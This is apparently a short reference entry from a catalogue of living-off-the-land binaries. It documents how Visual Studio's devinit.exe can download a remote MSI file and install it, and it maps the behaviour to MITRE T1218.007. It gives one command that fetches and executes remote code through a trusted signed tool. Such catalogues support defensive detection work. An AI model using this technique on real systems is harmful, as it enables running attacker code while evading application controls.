title: Devinit.exe
html:
Devinit.exe

Visual Studio 2019 tool

Execute

Executes code from a (remote) MSI file.

devinit.exe run -t msi-install -i {REMOTEURL:.msi}

Downloads an MSI file to C:\Windows\Installer and then installs it. — MITRE: T1218.007 — Privileges: User
